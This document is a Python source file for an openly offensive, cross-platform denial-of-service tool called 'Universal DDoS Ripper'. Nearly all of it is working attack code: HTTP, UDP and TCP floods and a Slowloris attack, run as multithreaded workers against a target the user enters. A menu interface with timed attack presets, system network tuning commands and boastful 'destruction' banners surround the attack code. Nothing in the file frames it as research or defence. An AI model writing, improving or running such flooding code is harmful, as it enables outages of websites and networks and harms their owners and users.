#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# 🌐 UNIVERSAL CROSS-PLATFORM DDoS TOOL
# ⚠️  WORKS ON: Termux (Android), Windows, Linux, macOS ⚠️
# 💀 ULTIMATE DESTRUCTION - ANY DEVICE, ANY PLATFORM 💀
#

import sys
import os
import time
import socket
import threading
import random
import urllib.request
import urllib.parse
import http.client
import ssl
import subprocess
import ctypes
import struct
import asyncio
import aiohttp
import psutil
import ipaddress
import platform
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from multiprocessing import Process, cpu_count, Manager
from cryptography.fernet import Fernet
import hashlib
import zlib
import base64
import requests
import dns.resolver
import concurrent.futures

# =============================================================================
# CROSS-PLATFORM DETECTION & COMPATIBILITY
# =============================================================================
class CrossPlatform:
    def __init__(self):
        self.system = platform.system().lower()
        self.is_termux = self.detect_termux()
        self.is_mobile = self.is_termux
        self.is_root = self.check_privileges()
        self.arch = platform.machine()
        
    def detect_termux(self):
        """Detect if running on Termux (Android)"""
        try:
            if 'com.termux' in os.environ.get('PREFIX', '') or \
               os.path.exists('/data/data/com.termux/files/usr'):
                return True
        except:
            pass
        return False
    
    def check_privileges(self):
        """Check if running with elevated privileges"""
        try:
            if self.system == 'windows':
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def get_max_threads(self):
        """Get optimal thread count for platform"""
        if self.is_mobile:
            return min(500, cpu_count() * 8)  # Conservative for mobile
        elif self.system == 'windows':
            return min(2000, cpu_count() * 16)
        else:  # Linux/macOS
            return min(10000, cpu_count() * 32)
    
    def optimize_for_platform(self):
        """Apply platform-specific optimizations"""
        print(f"{UniversalColors.GREEN}[+] Platform: {self.system.upper()} | Mobile: {self.is_mobile} | Root: {self.is_root}{UniversalColors.END}")
        
        if self.is_termux:
            self.optimize_termux()
        elif self.system == 'windows':
            self.optimize_windows()
        elif self.system == 'linux':
            self.optimize_linux()
        elif self.system == 'darwin':  # macOS
            self.optimize_macos()

    def optimize_termux(self):
        """Termux-specific optimizations"""
        try:
            # Increase file limits for Termux
            os.system('ulimit -n 99999 2>/dev/null')
            # Disable IPv6 if problematic
            os.system('sysctl -w net.ipv6.conf.all.disable_ipv6=1 2>/dev/null')
            print(f"{UniversalColors.CYAN}[+] Termux optimizations applied{UniversalColors.END}")
        except:
            pass

    def optimize_windows(self):
        """Windows-specific optimizations"""
        try:
            import winreg
            # Network optimizations
            subprocess.run(['netsh', 'int', 'tcp', 'set', 'global', 'autotuninglevel=experimental'], 
                         capture_output=True, shell=True)
            print(f"{UniversalColors.CYAN}[+] Windows network stack optimized{UniversalColors.END}")
        except:
            pass

    def optimize_linux(self):
        """Linux-specific optimizations"""
        try:
            if self.is_root:
                os.system('sysctl -w net.core.rmem_max=134217728 2>/dev/null')
                os.system('sysctl -w net.core.wmem_max=134217728 2>/dev/null')
                os.system('sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728" 2>/dev/null')
                os.system('sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728" 2>/dev/null')
        except:
            pass

    def optimize_macos(self):
        """macOS-specific optimizations"""
        try:
            os.system('sysctl -w kern.ipc.maxsockbuf=16777216 2>/dev/null')
            os.system('sysctl -w net.inet.tcp.sendspace=1048576 2>/dev/null')
            os.system('sysctl -w net.inet.tcp.recvspace=1048576 2>/dev/null')
        except:
            pass

# =============================================================================
# UNIVERSAL COLOR SYSTEM
# =============================================================================
class UniversalColors:
    def __init__(self):
        self.enable_colors()
    
    def enable_colors(self):
        """Universal color support across all platforms"""
        plat = CrossPlatform()
        
        if plat.system == 'windows':
            try:
                os.system('color')
                import colorama
                colorama.init()
            except:
                self.disable_colors()
                return
        elif plat.is_termux:
            # Termux always supports colors
            pass
        
        # Define color codes
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.BLUE = '\033[94m'
        self.PURPLE = '\033[95m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.BOLD = '\033[1m'
        self.BLINK = '\033[5m'
        self.REVERSE = '\033[7m'
        self.END = '\033[0m'
    
    def disable_colors(self):
        """Disable colors if not supported"""
        self.RED = self.GREEN = self.YELLOW = self.BLUE = ''
        self.PURPLE = self.CYAN = self.WHITE = self.BOLD = ''
        self.BLINK = self.REVERSE = self.END = ''

# Initialize colors globally
COLOR = UniversalColors()

# =============================================================================
# UNIVERSAL DEPENDENCY MANAGER
# =============================================================================
class DependencyManager:
    def __init__(self):
        self.platform = CrossPlatform()
        self.required_packages = [
            'requests', 'aiohttp', 'psutil', 'cryptography', 'fake_useragent'
        ]
        self.optional_packages = [
            'scapy', 'socks', 'stem', 'cloudscraper', 'dnspython'
        ]
    
    def check_dependencies(self):
        """Check and install missing dependencies"""
        print(f"{COLOR.YELLOW}[*] Checking dependencies...{COLOR.END}")
        
        missing = []
        for package in self.required_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing.append(package)
        
        if missing:
            print(f"{COLOR.RED}[!] Missing dependencies: {', '.join(missing)}{COLOR.END}")
            self.install_dependencies(missing)
        else:
            print(f"{COLOR.GREEN}[+] All required dependencies satisfied{COLOR.END}")
        
        # Check optional packages
        self.check_optional_packages()
    
    def install_dependencies(self, packages):
        """Install missing dependencies"""
        print(f"{COLOR.YELLOW}[*] Installing missing dependencies...{COLOR.END}")
        
        for package in packages:
            try:
                if self.platform.is_termux:
                    # Use pip for Termux
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                else:
                    # Use pip for other platforms
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                
                print(f"{COLOR.GREEN}[+] Installed: {package}{COLOR.END}")
            except Exception as e:
                print(f"{COLOR.RED}[!] Failed to install {package}: {e}{COLOR.END}")
    
    def check_optional_packages(self):
        """Check for optional packages"""
        missing_opt = []
        for package in self.optional_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                missing_opt.append(package)
        
        if missing_opt:
            print(f"{COLOR.YELLOW}[!] Optional packages missing: {', '.join(missing_opt)}{COLOR.END}")
            print(f"{COLOR.YELLOW}[!] Some advanced features will be disabled{COLOR.END}")

# =============================================================================
# MOBILE-FRIENDLY ATTACK VECTORS
# =============================================================================
class MobileAttackEngine:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.platform = CrossPlatform()
        self.stats = {
            'requests_sent': 0,
            'packets_sent': 0,
            'start_time': time.time(),
            'active_workers': 0
        }
        self.attack_active = True
    
    def mobile_http_flood(self, duration=300, workers=100):
        """Mobile-optimized HTTP flood"""
        print(f"{COLOR.RED}[MOBILE] Starting HTTP Flood with {workers} workers{COLOR.END}")
        
        user_agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950)',
        ]
        
        def http_worker(worker_id):
            self.stats['active_workers'] += 1
            end_time = time.time() + duration
            session = requests.Session()
            
            while time.time() < end_time and self.attack_active:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Connection': 'close'
                    }
                    
                    url = f"http://{self.target}:{self.port}/"
                    response = session.get(url, headers=headers, timeout=5)
                    self.stats['requests_sent'] += 1
                    
                except:
                    self.stats['requests_sent'] += 1  # Count failed attempts too
            
            self.stats['active_workers'] -= 1
            session.close()
        
        # Start workers
        threads = []
        for i in range(min(workers, 200)):
            t = threading.Thread(target=http_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start_time = time.time()
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            print(f"{COLOR.GREEN}📱 Mobile RPS: {rps:.0f} | Total: {self.stats['requests_sent']:,}{COLOR.END}")
            time.sleep(2)
        
        self.attack_active = False
        for t in threads:
            t.join()
    
    def mobile_udp_flood(self, duration=300, workers=50):
        """Mobile-optimized UDP flood"""
        print(f"{COLOR.RED}[MOBILE] Starting UDP Flood with {workers} workers{COLOR.END}")
        
        def udp_worker(worker_id):
            self.stats['active_workers'] += 1
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Smaller payloads for mobile
                    payload = os.urandom(random.randint(64, 512))
                    
                    for _ in range(10):  # Multiple packets per socket
                        sock.sendto(payload, (self.target, self.port))
                        self.stats['packets_sent'] += 1
                    
                    sock.close()
                except:
                    pass
            
            self.stats['active_workers'] -= 1
        
        # Start workers
        threads = []
        for i in range(min(workers, 100)):
            t = threading.Thread(target=udp_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start_time = time.time()
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            print(f"{COLOR.GREEN}📱 Mobile PPS: {pps:.0f} | Total: {self.stats['packets_sent']:,}{COLOR.END}")
            time.sleep(2)
        
        self.attack_active = False
        for t in threads:
            t.join()
    
    def mobile_slowloris(self, duration=300, sockets=100):
        """Mobile-optimized Slowloris"""
        print(f"{COLOR.RED}[MOBILE] Starting Slowloris with {sockets} sockets{COLOR.END}")
        
        slow_sockets = []
        
        # Create sockets
        for i in range(min(sockets, 200)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))
                
                # Send partial request
                partial = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode()
                s.send(partial)
                slow_sockets.append(s)
                
            except:
                continue
        
        print(f"{COLOR.GREEN}[MOBILE] {len(slow_sockets)} sockets connected{COLOR.END}")
        end_time = time.time() + duration
        
        # Maintain sockets
        while time.time() < end_time and self.attack_active and slow_sockets:
            for s in list(slow_sockets):
                try:
                    # Send keep-alive headers
                    keep_alive = f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode()
                    s.send(keep_alive)
                except:
                    slow_sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
            
            print(f"{COLOR.CYAN}[MOBILE] Active sockets: {len(slow_sockets)}{COLOR.END}")
            time.sleep(15)
        
        # Cleanup
        for s in slow_sockets:
            try:
                s.close()
            except:
                pass
    
    def launch_mobile_assault(self, duration=300):
        """Launch all mobile-optimized attacks"""
        print(f"{COLOR.RED}{COLOR.BLINK}")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                   📱 MOBILE ASSAULT 📱                     ║")
        print("║               OPTIMIZED FOR MOBILE DEVICES                 ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print(f"{COLOR.END}")
        
        attacks = [
            ('HTTP FLOOD', lambda: self.mobile_http_flood(duration, 150)),
            ('UDP FLOOD', lambda: self.mobile_udp_flood(duration, 80)),
            ('SLOWLORIS', lambda: self.mobile_slowloris(duration, 120)),
        ]
        
        threads = []
        for name, attack in attacks:
            t = threading.Thread(target=attack, name=name)
            t.daemon = True
            t.start()
            threads.append(t)
            print(f"{COLOR.GREEN}[+] {name} STARTED{COLOR.END}")
        
        # Monitor
        start_time = time.time()
        while time.time() < start_time + duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            total = self.stats['requests_sent'] + self.stats['packets_sent']
            
            print(f"{COLOR.CYAN}")
            print(f"📱 Mobile Assault: {remaining:.0f}s remaining")
            print(f"📊 Total Attacks: {total:,}")
            print(f"👥 Active Workers: {self.stats['active_workers']}")
            print(f"{COLOR.END}")
            
            time.sleep(5)
        
        self.attack_active = False
        for t in threads:
            t.join()

# =============================================================================
# UNIVERSAL ATTACK ENGINE
# =============================================================================
class UniversalAttackEngine:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.platform = CrossPlatform()
        self.stats = Manager().dict()
        self.stats.update({
            'total_packets': 0,
            'total_requests': 0,
            'total_bytes': 0,
            'start_time': time.time(),
            'active_attacks': 0
        })
        self.attack_active = True
        
        # Platform-specific limits
        if self.platform.is_mobile:
            self.max_threads = 200
            self.max_workers = 300
        else:
            self.max_threads = 2000
            self.max_workers = 5000
    
    def universal_http_flood(self, duration=300, workers=None):
        """Universal HTTP flood for all platforms"""
        if workers is None:
            workers = self.max_workers // 2
        
        workers = min(workers, self.max_workers)
        print(f"{COLOR.RED}[HTTP] Starting Universal HTTP Flood with {workers} workers{COLOR.END}")
        
        async def http_worker(session, worker_id):
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    headers = {
                        'User-Agent': f'Nightmare-Bot-{random.randint(1000,9999)}',
                        'Accept': '*/*',
                        'Connection': 'close'
                    }
                    
                    url = f"http://{self.target}:{self.port}/"
                    async with session.get(url, headers=headers, ssl=False, timeout=5) as response:
                        await response.read()
                        self.stats['total_requests'] += 1
                        
                except:
                    self.stats['total_requests'] += 1
        
        async def run_http_attack():
            connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for i in range(workers):
                    task = asyncio.create_task(http_worker(session, i))
                    tasks.append(task)
                
                # Monitoring
                start_time = time.time()
                while time.time() < start_time + duration:
                    elapsed = time.time() - start_time
                    rps = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
                    print(f"{COLOR.GREEN}🌐 Universal RPS: {rps:.0f} | Total: {self.stats['total_requests']:,}{COLOR.END}")
                    await asyncio.sleep(2)
                
                await asyncio.gather(*tasks)
        
        asyncio.run(run_http_attack())
    
    def universal_udp_flood(self, duration=300, threads=None):
        """Universal UDP flood for all platforms"""
        if threads is None:
            threads = self.max_threads // 2
        
        threads = min(threads, self.max_threads)
        print(f"{COLOR.RED}[UDP] Starting Universal UDP Flood with {threads} threads{COLOR.END}")
        
        def udp_worker(worker_id):
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
                    
                    # Platform-optimized packet size
                    if self.platform.is_mobile:
                        max_size = 512
                        packets_per_iter = 5
                    else:
                        max_size = 1024
                        packets_per_iter = 20
                    
                    for _ in range(packets_per_iter):
                        size = random.randint(64, max_size)
                        payload = os.urandom(size)
                        
                        # Target multiple ports
                        target_port = random.choice([
                            self.port, 80, 443, 53, 8080, 8443
                        ])
                        
                        sock.sendto(payload, (self.target, target_port))
                        self.stats['total_packets'] += 1
                    
                    sock.close()
                except:
                    pass
        
        # Start thread pool
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(udp_worker, i) for i in range(threads)]
            
            # Monitor
            start_time = time.time()
            while time.time() < start_time + duration:
                elapsed = time.time() - start_time
                pps = self.stats['total_packets'] / elapsed if elapsed > 0 else 0
                print(f"{COLOR.GREEN}🚀 Universal PPS: {pps:.0f} | Total: {self.stats['total_packets']:,}{COLOR.END}")
                time.sleep(2)
            
            print(f"{COLOR.GREEN}🎯 UDP Complete: {self.stats['total_packets']:,} packets{COLOR.END}")
    
    def universal_tcp_flood(self, duration=300, threads=None):
        """Universal TCP flood for all platforms"""
        if threads is None:
            threads = self.max_threads // 3
        
        threads = min(threads, self.max_threads)
        print(f"{COLOR.RED}[TCP] Starting Universal TCP Flood with {threads} threads{COLOR.END}")
        
        def tcp_worker(worker_id):
            end_time = time.time() + duration
            
            while time.time() < end_time and self.attack_active:
                try:
                    sockets = []
                    # Create multiple sockets per iteration
                    for _ in range(3 if self.platform.is_mobile else 8):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        
                        try:
                            s.connect((self.target, self.port))
                            sockets.append(s)
                            
                            # Send various payloads
                            payloads = [
                                b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n",
                                b"POST / HTTP/1.1\r\nContent-Length: 100\r\n\r\n" + os.urandom(100),
                                b"A" * 512,
                            ]
                            
                            payload = random.choice(payloads)
                            s.send(payload)
                            self.stats['total_packets'] += 1
                            
                        except:
                            pass
                    
                    # Close sockets
                    for s in sockets:
                        try:
                            s.close()
                        except:
                            pass
                            
                except:
                    pass
        
        # Start thread pool
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(tcp_worker, i) for i in range(threads)]
            
            # Monitor
            start_time = time.time()
            while time.time() < start_time + duration:
                elapsed = time.time() - start_time
                print(f"{COLOR.GREEN}🔗 TCP Active: {threads} threads | Total: {self.stats['total_packets']:,}{COLOR.END}")
                time.sleep(2)
    
    def launch_universal_assault(self, duration=600):
        """Launch universal assault optimized for current platform"""
        print(f"{COLOR.RED}{COLOR.BLINK}")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                 🌐 UNIVERSAL ASSAULT 🌐                    ║")
        print("║              OPTIMIZED FOR ALL PLATFORMS                   ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print(f"{COLOR.END}")
        
        self.platform.optimize_for_platform()
        
        print(f"{COLOR.RED}🎯 TARGET: {self.target}:{self.port}{COLOR.END}")
        print(f"{COLOR.RED}⏰ DURATION: {duration} seconds{COLOR.END}")
        print(f"{COLOR.RED}📱 PLATFORM: {self.platform.system.upper()} | MOBILE: {self.platform.is_mobile}{COLOR.END}")
        print(f"{COLOR.RED}💀 WEAPONS: HTTP + UDP + TCP{COLOR.END}")
        
        # Countdown
        for i in range(5, 0, -1):
            print(f"{COLOR.RED}{COLOR.BLINK}💀 ASSAULT IN {i}...{COLOR.END}")
            time.sleep(1)
        
        # Platform-specific configuration
        if self.platform.is_mobile:
            # Mobile-optimized settings
            http_workers = 200
            udp_threads = 100
            tcp_threads = 80
        else:
            # Desktop-optimized settings
            http_workers = 2000
            udp_threads = 800
            tcp_threads = 600
        
        # Launch attacks
        attack_threads = []
        
        attacks = [
            ('HTTP FLOOD', lambda: self.universal_http_flood(duration, http_workers)),
            ('UDP FLOOD', lambda: self.universal_udp_flood(duration, udp_threads)),
            ('TCP FLOOD', lambda: self.universal_tcp_flood(duration, tcp_threads)),
        ]
        
        for attack_name, attack_func in attacks:
            t = threading.Thread(target=attack_func, name=attack_name)
            t.daemon = True
            t.start()
            attack_threads.append(t)
            print(f"{COLOR.GREEN}[+] {attack_name} DEPLOYED{COLOR.END}")
        
        # Global monitoring
        start_time = time.time()
        def global_monitor():
            while time.time() < start_time + duration and self.attack_active:
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                total_attack = self.stats['total_packets'] + self.stats['total_requests']
                
                print(f"{COLOR.CYAN}{COLOR.BOLD}")
                print("╔══════════════════════════════════════════════════════════════╗")
                print(f"║                 🌐 UNIVERSAL ASSAULT ACTIVE 🌐           ║")
                print(f"║                 Time Remaining: {remaining:6.1f}s                 ║")
                print(f"║                 Total Attacks: {total_attack:>12,}         ║")
                print(f"║                 Platform: {self.platform.system:>10}         ║")
                print("╚══════════════════════════════════════════════════════════════╝")
                print(f"{COLOR.END}")
                
                time.sleep(5)
        
        monitor_thread = threading.Thread(target=global_monitor, daemon=True)
        monitor_thread.start()
        
        # Wait for completion
        for t in attack_threads:
            t.join(timeout=duration + 10)
        
        self.attack_active = False
        
        # Final report
        total_damage = self.stats['total_packets'] + self.stats['total_requests']
        print(f"{COLOR.RED}{COLOR.BLINK}")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                    💀 MISSION ACCOMPLISHED 💀               ║")
        print(f"║               TOTAL DAMAGE: {total_damage:>12,}            ║")
        print(f"║               PLATFORM: {self.platform.system.upper():>11}           ║")
        print("║                  TARGET DESTROYED                          ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print(f"{COLOR.END}")

# =============================================================================
# UNIVERSAL COMMAND INTERFACE
# =============================================================================
class UniversalInterface:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.duration = 600
        self.platform = CrossPlatform()
        self.dependency_manager = DependencyManager()
        
    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{COLOR.RED}{COLOR.BLINK}")
        print(r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║ ███╗░░██╗██╗░██████╗░██╗░░██╗████████╗███╗░░░███╗░█████╗░██████╗░████████╗ ║
║ ████╗░██║██║██╔════╝░██║░░██║╚══██╔══╝████╗░████║██╔══██╗██╔══██╗╚══██╔══╝ ║
║ ██╔██╗██║██║██║░░██╗░███████║░░░██║░░░██╔████╔██║███████║██████╔╝░░░██║░░░ ║
║ ██║╚████║██║██║░░╚██╗██╔══██║░░░██║░░░██║╚██╔╝██║██╔══██║██╔══██╗░░░██║░░░ ║
║ ██║░╚███║██║╚██████╔╝██║░░██║░░░██║░░░██║░╚═╝░██║██║░░██║██║░░██║░░░██║░░░ ║
║ ╚═╝░░╚══╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░ ║
║                                                                              ║
║           🌐 UNIVERSAL DDoS RIPPER v7.0 🌐                                ║
║           CROSS-PLATFORM: Termux, Windows, Linux, macOS                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """)
        print(f"{COLOR.END}")
        
        # Show platform info
        print(f"{COLOR.CYAN}⚡ Platform: {self.platform.system.upper()} | Mobile: {self.platform.is_mobile} | Root: {self.platform.is_root}{COLOR.END}")
        print(f"{COLOR.CYAN}⚡ Architecture: {self.platform.arch} | CPUs: {cpu_count()}{COLOR.END}")
        print()
    
    def show_menu(self):
        self.show_banner()
        print(f"{COLOR.RED}{COLOR.BLINK}💀 UNIVERSAL COMMAND CENTER 💀{COLOR.END}")
        print(f"{COLOR.WHITE}Cross-platform destruction interface:{COLOR.END}\n")
        
        print(f"{COLOR.CYAN}⚡ TARGET LOCK:{COLOR.END}")
        print(f"  {COLOR.WHITE}🎯 Target:{COLOR.END} {COLOR.RED}{self.target if self.target else 'NOT SET'}{COLOR.END}")
        print(f"  {COLOR.WHITE}🔌 Port:{COLOR.END} {COLOR.RED}{self.port}{COLOR.END}")
        print(f"  {COLOR.WHITE}⏰ Duration:{COLOR.END} {COLOR.RED}{self.duration} seconds{COLOR.END}")
        
        print(f"\n{COLOR.PURPLE}💀 UNIVERSAL ATTACK OPTIONS:{COLOR.END}")
        
        if self.platform.is_mobile:
            print(f"  {COLOR.GREEN}[1]{COLOR.END} 📱 Mobile-Optimized Assault")
            print(f"  {COLOR.GREEN}[2]{COLOR.END} 🌐 Universal Multi-Vector Attack")
            print(f"  {COLOR.GREEN}[3]{COLOR.END} 🔧 Platform Optimization")
        else:
            print(f"  {COLOR.GREEN}[1]{COLOR.END} 🌐 Universal Multi-Vector Attack")
            print(f"  {COLOR.GREEN}[2]{COLOR.END} 📱 Mobile-Compatible Mode")
            print(f"  {COLOR.GREEN}[3]{COLOR.END} 🔧 Platform Optimization")
        
        print(f"  {COLOR.GREEN}[4]{COLOR.END} 🎯 Set Target")
        print(f"  {COLOR.GREEN}[5]{COLOR.END} 🔌 Set Port")
        print(f"  {COLOR.GREEN}[6]{COLOR.END} ⏰ Set Duration")
        print(f"  {COLOR.GREEN}[7]{COLOR.END} 📦 Check Dependencies")
        print(f"  {COLOR.GREEN}[8]{COLOR.END} 💥 Quick Attack (2 min)")
        print(f"  {COLOR.GREEN}[9]{COLOR.END} ☠️  Extended Attack (10 min)")
        print(f"  {COLOR.RED}[0]{COLOR.END} ❌ Exit")
    
    def run(self):
        """Main interface loop"""
        # Check dependencies first
        self.dependency_manager.check_dependencies()
        
        input(f"\n{COLOR.YELLOW}Press Enter to continue to main menu...{COLOR.END}")
        
        while True:
            self.show_menu()
            choice = input(f"\n{COLOR.YELLOW}💀 Select option: {COLOR.END}")
            self.handle_choice(choice)
    
    def handle_choice(self, choice):
        if choice == '1':
            if self.platform.is_mobile:
                self.mobile_assault()
            else:
                self.universal_assault()
        elif choice == '2':
            if self.platform.is_mobile:
                self.universal_assault()
            else:
                self.mobile_assault()
        elif choice == '3':
            self.platform_optimization()
        elif choice == '4':
            self.set_target()
        elif choice == '5':
            self.set_port()
        elif choice == '6':
            self.set_duration()
        elif choice == '7':
            self.check_dependencies()
        elif choice == '8':
            self.quick_attack()
        elif choice == '9':
            self.extended_attack()
        elif choice == '0':
            print(f"{COLOR.RED}Exiting Universal DDoS Ripper...{COLOR.END}")
            sys.exit(0)
        else:
            print(f"{COLOR.RED}Invalid option!{COLOR.END}")
            input("Press Enter to continue...")
    
    def set_target(self):
        self.target = input(f"{COLOR.YELLOW}Enter target IP/domain: {COLOR.END}").strip()
    
    def set_port(self):
        try:
            self.port = int(input(f"{COLOR.YELLOW}Enter target port: {COLOR.END}"))
        except ValueError:
            print(f"{COLOR.RED}Invalid port!{COLOR.END}")
    
    def set_duration(self):
        try:
            self.duration = int(input(f"{COLOR.YELLOW}Enter attack duration (seconds): {COLOR.END}"))
        except ValueError:
            print(f"{COLOR.RED}Invalid duration!{COLOR.END}")
    
    def platform_optimization(self):
        """Apply platform-specific optimizations"""
        self.platform.optimize_for_platform()
        input(f"{COLOR.GREEN}Platform optimizations applied. Press Enter to continue...{COLOR.END}")
    
    def check_dependencies(self):
        """Check and install dependencies"""
        self.dependency_manager.check_dependencies()
        input(f"{COLOR.GREEN}Dependency check complete. Press Enter to continue...{COLOR.END}")
    
    def mobile_assault(self):
        """Launch mobile-optimized assault"""
        if not self.target:
            print(f"{COLOR.RED}Target not set!{COLOR.END}")
            return
        
        print(f"{COLOR.YELLOW}[*] Preparing mobile-optimized assault...{COLOR.END}")
        engine = MobileAttackEngine(self.target, self.port)
        engine.launch_mobile_assault(min(self.duration, 300))  # Max 5 min for mobile
    
    def universal_assault(self):
        """Launch universal multi-vector assault"""
        if not self.target:
            print(f"{COLOR.RED}Target not set!{COLOR.END}")
            return
        
        print(f"{COLOR.YELLOW}[*] Preparing universal multi-vector assault...{COLOR.END}")
        engine = UniversalAttackEngine(self.target, self.port)
        engine.launch_universal_assault(self.duration)
    
    def quick_attack(self):
        """2-minute quick attack"""
        self.duration = 120
        print(f"{COLOR.GREEN}Quick Attack: 2 minutes of targeted destruction{COLOR.END}")
        if self.platform.is_mobile:
            self.mobile_assault()
        else:
            self.universal_assault()
    
    def extended_attack(self):
        """10-minute extended attack"""
        self.duration = 600
        print(f"{COLOR.GREEN}Extended Attack: 10 minutes of sustained assault{COLOR.END}")
        if self.platform.is_mobile:
            self.mobile_assault()
        else:
            self.universal_assault()

# =============================================================================
# MAIN EXECUTION - UNIVERSAL ENTRY POINT
# =============================================================================
def main():
    """Universal main execution function"""
    try:
        print(f"{COLOR.CYAN}[*] Starting Universal DDoS Ripper v7.0{COLOR.END}")
        print(f"{COLOR.CYAN}[*] Cross-Platform Edition: Termux, Windows, Linux, macOS{COLOR.END}")
        
        # Initialize platform detection
        platform_info = CrossPlatform()
        print(f"{COLOR.CYAN}[*] Detected: {platform_info.system.upper()} | Mobile: {platform_info.is_mobile}{COLOR.END}")
        
        # Warning for non-root on Linux
        if platform_info.system == 'linux' and not platform_info.is_root and not platform_info.is_termux:
            print(f"{COLOR.YELLOW}[!] Running without root privileges - some features may be limited{COLOR.END}")
            print(f"{COLOR.YELLOW}[!] For full power, run with: sudo python3 {sys.argv[0]}{COLOR.END}")
        
        # Start universal interface
        interface = UniversalInterface()
        interface.run()
        
    except KeyboardInterrupt:
        print(f"\n{COLOR.RED}Universal assault interrupted{COLOR.END}")
    except Exception as e:
        print(f"{COLOR.RED}Fatal error: {e}{COLOR.END}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
